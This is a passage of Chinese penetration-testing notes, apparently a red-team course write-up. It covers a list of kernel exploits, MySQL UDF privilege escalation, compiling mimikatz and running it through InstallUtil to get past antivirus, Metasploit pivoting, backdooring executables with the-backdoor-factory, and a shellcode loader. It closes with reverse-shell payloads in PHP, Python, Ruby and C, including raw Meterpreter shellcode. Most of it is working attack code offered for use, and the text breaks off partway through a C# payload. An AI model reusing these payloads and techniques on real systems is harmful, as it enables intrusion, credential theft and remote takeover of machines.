class="line">CVE-2009-2692 [sock_sendpage2] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.42.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2,2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15,2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)</span><br><span class="line">CVE-2009-1337 [exit_notify] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)</span><br><span class="line">CVE-2009-1185 [udev] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)</span><br><span class="line">CVE-2008-4210 [ftrex] (2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19,2.6.20, 2.6.21, 2.6.22)</span><br><span class="line">CVE-2008-0600 [vmsplice2] (2.6.23, 2.6.24)</span><br><span class="line">CVE-2008-0600 [vmsplice1] (2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.24.1)</span><br><span class="line">CVE-2006-3626 [h00lyshit] (2.6.8, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16)</span><br><span class="line">CVE-2006-2451 [raptor_prctl] (2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17)</span><br><span class="line">CVE-2005-0736 [krad3] (2.6.5, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11)</span><br><span class="line">CVE-2005-1263 [binfmt_elf.c] (Linux kernel 2.x.x to 2.2.27-rc2, 2.4.x to 2.4.31-pre1, and 2.6.x to 2.6.12-rc4)</span><br><span class="line">CVE-2004-1235 [elflbl] (2.4.29)</span><br><span class="line">CVE-N&#x2F;A [caps_to_root] (2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2004-0077 [mremap_pte] (2.4.20, 2.2.24, 2.4.25, 2.4.26, 2.4.27</span><br></pre></td></tr></table></figure>
<h2 id="6-反攻的一次溯源-—-项目实战3"><a href="#6-反攻的一次溯源-—-项目实战3" class="headerlink" title="6. 反攻的一次溯源 — 项目实战3"></a>6. 反攻的一次溯源 — 项目实战3</h2><p>一韩国server  2003服务器，3389存在shift后门，且有一个<code>DHCP</code>查看应用，存在<code>loadfile</code>漏洞（这里我推测就是WEB应用存在SQL注入，可以读取本地文件）。HEX编码读取<code>shift</code>后门，本地再<code>unhex</code>解码回来。然后反编译该后门，获取密码。</p>
<h2 id="7-SqlServer-常用操作远程桌面语句"><a href="#7-SqlServer-常用操作远程桌面语句" class="headerlink" title="7. SqlServer 常用操作远程桌面语句"></a>7. SqlServer 常用操作远程桌面语句</h2><ul>
<li><p>是否开启远程桌面</p>
<ul>
<li> <code>EXEC master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;, &#39;SYSTEM\CurrentControlSet\Control\Terminal Server&#39;, &#39;fDenyTSConnections&#39;</code></li>
<li> 1：表示关闭</li>
<li> 0：表示开启</li>
</ul>
</li>
<li><p>读取远程桌面端口</p>
<ul>
<li><code>EXEC master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;, &#39;SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp&#39;, &#39;PortNumber&#39;</code></li>
</ul>
</li>
<li><p>开启远程桌面</p>
<ul>
<li> <code>EXEC master.dbo.xp_regwrite&#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\TerminalServer&#39;,&#39;fDenyTSConnections&#39;,&#39;REG_DWORD&#39;,0;</code></li>
</ul>
</li>
<li><p>关闭远程桌面</p>
<ul>
<li><code>EXEC master.dbo.xp_regwrite&#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\TerminalServer&#39;,&#39;fDenyTSConnections&#39;,&#39;REG_DWORD&#39;,1;</code></li>
</ul>
</li>
</ul>
<h1 id="二、实战"><a href="#二、实战" class="headerlink" title="二、实战"></a>二、实战</h1><h2 id="8-模拟诉求任务攻击"><a href="#8-模拟诉求任务攻击" class="headerlink" title="8. 模拟诉求任务攻击"></a>8. 模拟诉求任务攻击</h2><p>第一个shell为目标主站shell，为08 R2。提权后，改为信息收集</p>
<ul>
<li>进程收集</li>
<li>账户搜集</li>
<li>重要路径搜集</li>
<li>数据库密码搜集</li>
<li>杀毒软件搜集</li>
<li>管理员习惯搜集</li>
</ul>
<p>通过信息收集，获得<code>Server 2003</code>机器权限，为一台开发机。目标仅支持 <code>asp</code>，但是服务器中安装有<code> mysql</code>，<code>php</code> 等。并且无 <code>asp to mysql Device Drive IIS</code> 配置中也并不支持 <code>php</code>。继续信息收集</p>
<p><code>type C:\MySQL\MySQL Server 5.0\data\mysql\user.MYD </code>，获得<code>Mysql</code>数据库的<code>ROOT</code>哈希，在非交互式<code>shell</code>下加上<code>-e</code>参数执行SQL语句，使用<code>UDF</code>提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;create table a (cmd LONGBLOB);&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;insert into a (cmd) values hex(load_file(&#39;C:\\xxxx\\xxxx.dll&#39;)));&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;SELECT unhex(cmd) FROM a INTO DUMPFILE &#39;c:\\windows\\system32\\xxxx.dll&#39;;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;CREATE FUNCTION shell RETURNS STRING SONAME &#39;udf.dll&#39;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;select shell(&#39;cmd&#39;,&#39;C:\\xxxx\\xxx\\xxxxx.exe&#39;);&quot;</span><br></pre></td></tr></table></figure>
<h2 id="16-红蓝对抗渗透测试1"><a href="#16-红蓝对抗渗透测试1" class="headerlink" title="16. 红蓝对抗渗透测试1"></a>16. 红蓝对抗渗透测试1</h2><ul>
<li>BloodHound</li>
</ul>
<blockquote>
<p>BloodHound是2016年出现大家的视线中，它是一个分析和解读AD中权限关系的一个工具。对于攻击 </p>
<p>者来说，能快速的获取到域中的线索以便进行下一步攻击，而对于防御者来说，可以更快速的得知攻击 </p>
<p>者可能采取的攻击途径以及域中的可突破的途径。</p>
</blockquote>
<p>项目地址： <a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a> </p>
<ul>
<li>popy</li>
</ul>
<blockquote>
<p>Pupy是一个开源，跨平台（Windows，Linux，OSX，Android），多功能RAT（远程管理工具）和主 </p>
<p>要用python编写的后期开发工具。它具有全内存读取操作，进程注入等。Pupy可以使用各种传输进行 </p>
<p>通信，迁移到进程（注入），从内存加载远程Python代码</p>
</blockquote>
<p>项目地址： <a target="_blank" rel="noopener" href="https://github.com/n1nj4sec/pupy">https://github.com/n1nj4sec/pupy</a> </p>
<ul>
<li>GreatSCT</li>
</ul>
<blockquote>
<p>GreatSCT 是以 metasploit payload 为核心，白名单辅助 payload 执行框架</p>
</blockquote>
<p>项目地址： <a target="_blank" rel="noopener" href="https://github.com/GreatSCT/GreatSCT">https://github.com/GreatSCT/GreatSCT</a> </p>
<h2 id="51-项目回忆：体系的本质是知识点串联"><a href="#51-项目回忆：体系的本质是知识点串联" class="headerlink" title="51. 项目回忆：体系的本质是知识点串联"></a>51. 项目回忆：体系的本质是知识点串联</h2><p>目标机器有360全家桶</p>
<ul>
<li>免杀</li>
</ul>
<p>使用shellcode_launcher对shellcode分离免杀</p>
<ul>
<li>提权</li>
</ul>
<p>在目标机上找到mysql数据库文件,下载<code>users.MYI</code>、<code>users.MYD</code>、<code>users.frm</code>，本地安装<code>mysql</code>加载文件，获取目标数据库的帐号密码</p>
<p>使用非交互模式，使用udf提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;create table mysql.a (cmd LONGBLOB);&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;insert into mysql.a (cmd) values hex(load_file(&#39;C:\\xxxx\\xxxx.dll&#39;)));&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;SELECT unhex(cmd) FROM mysql.a INTO DUMPFILE &#39;c:\\windows\\system32\\xxxx.dll&#39;;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;CREATE FUNCTION shell RETURNS STRING SONAME &#39;udf.dll&#39;&quot;</span><br><span class="line">mysql -uroot -pxxxxxxxx mysql -e &quot;select shell(&#39;cmd&#39;,&#39;whoami&#39;);&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>登录服务器</li>
</ul>
<p>激活guest帐号，并提升到administrator组</p>
<ul>
<li>抓取明文密码</li>
</ul>
<p>先在powershell中执行下面命令，生成Key.snk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$key &#x3D; &#39;BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq&#x2F;vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu&#x2F;WxZaffHS2te&#x2F;PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g&#x2F;P+JpXGN0&#x2F;+Hitolufo7Ucjh+WvZAU&#x2F;&#x2F;dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm&#x2F;ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15&#x2F;4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX&#x2F;tqcBuBIg&#x2F;cpcDHps&#x2F;6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b&#x2F;WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4&#x3D;&#39;</span><br><span class="line"></span><br><span class="line">$Content &#x3D; [System.Convert]::FromBase64String($key)</span><br><span class="line"></span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br></pre></td></tr></table></figure>
<p>​    CSC编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe &#x2F;r:System.EnterpriseServices.dll &#x2F;r:System.IO.Compression.dll &#x2F;target:library &#x2F;keyfile:key.snk &#x2F;unsafe &#x2F;out:test.exe mimikatz.cs</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;logToConsole&#x3D;false &#x2F;U test.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>横向渗透</li>
</ul>
<p>搜集目标机的mssql，mysql，rdp 密码，搜 集所在内网的拓扑，来辅助本次的横向扩展</p>
<h2 id="69-渗透，持续渗透，后渗透的本质"><a href="#69-渗透，持续渗透，后渗透的本质" class="headerlink" title="69. 渗透，持续渗透，后渗透的本质"></a>69. 渗透，持续渗透，后渗透的本质</h2><ul>
<li>模拟攻击流程</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击机通过SQL注入，上传webshell 拿到主机A1权限 </span><br><span class="line">主机A1通过weblogic反序列化漏洞拿到主机A2权限 </span><br><span class="line">主机A2通过信息收集，获得主机B权限 </span><br><span class="line">主机B通过MS14-068漏洞获取域控主机C权限</span><br></pre></td></tr></table></figure>
<ul>
<li><p>过程</p>
<ul>
<li><p>扫描主机A1对攻击机开放端口：80,22</p>
</li>
<li><p>扫描主机A1-Web目录结构</p>
</li>
<li><p>主机A1-Web搜索处存在sql注入</p>
</li>
<li><p>登录后台得到shell</p>
</li>
<li><p>msfvenom生成tcp payload 以php一句话执行</p>
</li>
<li><p>配置msf，获得meterpreter shell权限 </p>
</li>
<li><p>A1对内信息搜集发现A2，并且针对A1，没有可用提权漏洞（Web非root权限），放弃提权</p>
</li>
<li><p>以A1作为跳板添加虚拟路由，并且开始做针对A2的对内信息搜集</p>
<ul>
<li>扫描开放端口</li>
</ul>
</li>
<li><p>以A1跳板发现A2部署weblogic，并且存在漏洞。转发目标机7001至本地，利用漏洞</p>
<ul>
<li>portfwd add -r 192.168.1.160 -p 7001 -l 7001</li>
</ul>
</li>
<li><p>msfvenom生成payload 并尝试使用weblogic漏洞上传payload</p>
</li>
<li><p>执行payload,meterpreter获取session，添加路由</p>
</li>
<li><p>发现A2全补丁，放弃提权，（weblogic为user权限）对内信息刺探A2，得到 weblogic相关 </p>
<p>配置文件，解密后，得到密码</p>
</li>
<li><p>尝试做二级跳板，以weblogic相关配置，尝试对B（域内成员）的渗透（SMB）</p>
</li>
<li><p>获取B权限（system），尝试对内B的本身信息搜集，发现域账号（普通成员）user1</p>
</li>
<li><p>尝试三级跳板，尝试获取sid，以及域控对内相关IP，尝试越权，获取域控权限</p>
</li>
<li><p>利用user1生成票据并注入内存</p>
</li>
</ul>
</li>
</ul>
<h2 id="92-：实战中的Payload应用"><a href="#92-：实战中的Payload应用" class="headerlink" title="92. ：实战中的Payload应用"></a>92. ：实战中的Payload应用</h2><p>绕过360套装</p>
<ul>
<li>配置payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby .&#x2F;Micropoor_rev.rb 8080</span><br></pre></td></tr></table></figure>
<ul>
<li>上传Micropoor_shellcode_x64.exe </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>配置msf</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Micropoor_shellcode_x64.exe 8080 192.168.1.4</span><br></pre></td></tr></table></figure>
<h2 id="94-基于实战中的small-payload"><a href="#94-基于实战中的small-payload" class="headerlink" title="94. 基于实战中的small payload"></a>94. 基于实战中的small payload</h2><ul>
<li>payload生成</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.5 LPORT&#x3D;53 ‐b &#39;\x00&#39; ‐f exe &gt; First.exe</span><br></pre></td></tr></table></figure>
<ul>
<li><p>第一次优化</p>
<ul>
<li>payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.5 LPORT&#x3D;53 ‐b &#39;\x00&#39; ‐f c</span><br></pre></td></tr></table></figure>
<ul>
<li>建立Micropoor_small_payload工程</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">设置平台工具集： Visual Studio 2017 -Windows XP(v141_xp)</span><br><span class="line">运行库： 多线程（&#x2F;MT）</span><br><span class="line">优化： 使大小最小化（&#x2F;01）</span><br><span class="line">预编译头：不使用预编译头</span><br><span class="line">生成调试信息：否</span><br><span class="line">自定义入口点：execMicropoor_shellcode</span><br></pre></td></tr></table></figure>
<ul>
<li>源码如下</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"># include &lt;windows.h&gt;  </span><br><span class="line">int main(void)  </span><br><span class="line">&#123;  </span><br><span class="line">char *shellcode &#x3D; (char *)&quot;Micropoor_shellcode&quot;;  </span><br><span class="line">DWORD Micropoor_shellcode;  </span><br><span class="line">BOOL ret &#x3D; VirtualProtect(shellcode, strlen(shellcode),  </span><br><span class="line">PAGE_EXECUTE_READWRITE, &amp;Micropoor_shellcode);  </span><br><span class="line">if (!ret) &#123;  </span><br><span class="line">return EXIT_FAILURE;  </span><br><span class="line">&#125;  </span><br><span class="line">((void(*)(void))shellcode)();  </span><br><span class="line">return EXIT_SUCCESS;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>第二次优化</p>
<ul>
<li>载入PEID </li>
<li>合并<strong>data to text</strong>，<strong>rdata to text</strong> 在次生成</li>
</ul>
</li>
<li><p>第三次优化</p>
<ul>
<li>在00000E60起含有大部分000h，充填掉00，在次生成payload</li>
</ul>
</li>
</ul>
<h1 id="三、-工具讲解"><a href="#三、-工具讲解" class="headerlink" title="三、 工具讲解"></a>三、 工具讲解</h1><h2 id="9-工具介绍-the-backdoor-factory"><a href="#9-工具介绍-the-backdoor-factory" class="headerlink" title="9. 工具介绍 the-backdoor-factory"></a>9. 工具介绍 the-backdoor-factory</h2><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a></p>
<p>原理介绍</p>
<blockquote>
<p>可执行二进制文件中有大量的 00，这些 00 是不包含数据的，将这些数据替换成 payload，并且在 </p>
<p>程序执行的时候，jmp 到代码段，来触发 payload</p>
</blockquote>
<p><code>the-backdoor-factory</code>使用</p>
<ul>
<li>检测是否支持后门植入 <ul>
<li>./backdoor.py -f ~/demo/guobang.exe -s</li>
</ul>
</li>
<li>测试裂缝空间<code>size150</code><ul>
<li>./backdoor.py -f ~/demo/guobang.exe -c -l 150</li>
</ul>
</li>
<li>查看可用<code>Payload</code><ul>
<li>./backdoor.py -f ~/demo/guobang.exe -s show</li>
</ul>
</li>
<li>插入<code>Payload</code>并生成文件<ul>
<li>./backdoor.py -f ~/demo/guobang.exe -H 192.168.1.111 -P 8080 -s iat_reverse_tcp_stager_threaded</li>
</ul>
</li>
</ul>
<p>配置MSF:</p>
<ul>
<li>use exploit/multi/handler</li>
<li>set payload windows/meterpreter/reverse_tcp</li>
<li>set lhost 192.168.1.111</li>
<li>set lport 8080</li>
<li>exploit -j</li>
</ul>
<p>运行新生成的后门时，即会反弹<code>meterpreter shell</code></p>
<h2 id="10-msfvenom常用生成payload命令"><a href="#10-msfvenom常用生成payload命令" class="headerlink" title="10. msfvenom常用生成payload命令"></a>10. msfvenom常用生成payload命令</h2><p>便捷Payload生成工具:<a target="_blank" rel="noopener" href="https://github.com/Screetsec/TheFatRat">https://github.com/Screetsec/TheFatRat</a></p>
<h2 id="14-基于第十课补充-Payload-1"><a href="#14-基于第十课补充-Payload-1" class="headerlink" title="14. 基于第十课补充 Payload 1"></a>14. 基于第十课补充 Payload 1</h2><ul>
<li>PHP</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$sock</span>=fsockopen(<span class="string">&quot;xx.xx.xx.xx&quot;</span>,xx);exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>python</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,struct,time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s=socket.socket(<span class="number">2</span>,socket.SOCK_STREAM)</span><br><span class="line">        s.connect((<span class="string">&#x27;x.x.x.x&#x27;</span>,xx))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        time.sleep(<span class="number">5</span>) l=struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>,s.recv(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">d=s.recv(l)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(d)&lt;l:</span><br><span class="line">    d+=s.recv(l-<span class="built_in">len</span>(d))</span><br><span class="line">exec(d,&#123;<span class="string">&#x27;s&#x27;</span>:s&#125;)</span><br></pre></td></tr></table></figure>
<ul>
<li>C</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//删除特征</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=8.8.8.8 LPORT=88 -f c | tr -d &#x27;&quot;&#x27; | tr -d &#x27;\n&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from ctypes <span class="keyword">import</span> *</span><br><span class="line">reverse_shell = <span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x08\x08\x08\x08\x68\x02\x00\x00\x58\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x61\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9\x71\xff\xff\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span></span><br><span class="line">micropoorshell = create_string_buffer(reverse_shell, len(reverse_shell))</span><br><span class="line">shellcode = cast(micropoorshell, CFUNCTYPE(c_void_p))</span><br><span class="line">shellcode()</span><br></pre></td></tr></table></figure>
<ul>
<li>Ruby- Payload</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;socket&#x27;</span>;</span><br><span class="line">c=TCPSocket.new(<span class="string">&quot;xx.xx.xx.xx&quot;</span>, x);<span class="variable">$stdin</span>.reopen(c);<span class="variable">$stdout</span>.reopen(c);<span class="variable">$stderr</span>.reopen(c);<span class="variable">$stdin</span> (IO.popen(l,<span class="string">&quot;rb&quot;</span>)&#123;<span class="params">|fd|</span> fd.each_line &#123;<span class="params">|o|</span> c.puts(o.strip) &#125;&#125;) <span class="keyword">rescue</span> <span class="literal">nil</span> &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;socket&#x27;</span>;</span><br><span class="line">f=TCPSocket.open(<span class="string">&quot;xx.xx.xx.xx&quot;</span>,xx).to_i;exec sprintf(<span class="string">&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;</span>,f,f,f)</span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;socket&#x27;</span>;</span><br><span class="line">c=TCPSocket.new(<span class="string">&quot;xx.xx.xx.xx&quot;</span>,<span class="string">&quot;xx&quot;</span>);<span class="keyword">while</span>(cmd=c.gets);IO.popen(cmd,<span class="string">&quot;r&quot;</span>)&#123;<span class="params">|io|</span>c.print io.read&#125;<span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h2 id="15-基于第十课补充payload2"><a href="#15-基于第十课补充payload2" class="headerlink" title="15. 基于第十课补充payload2"></a>15. 基于第十课补充payload2</h2><ul>
<li>c#</li>
</ul>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> 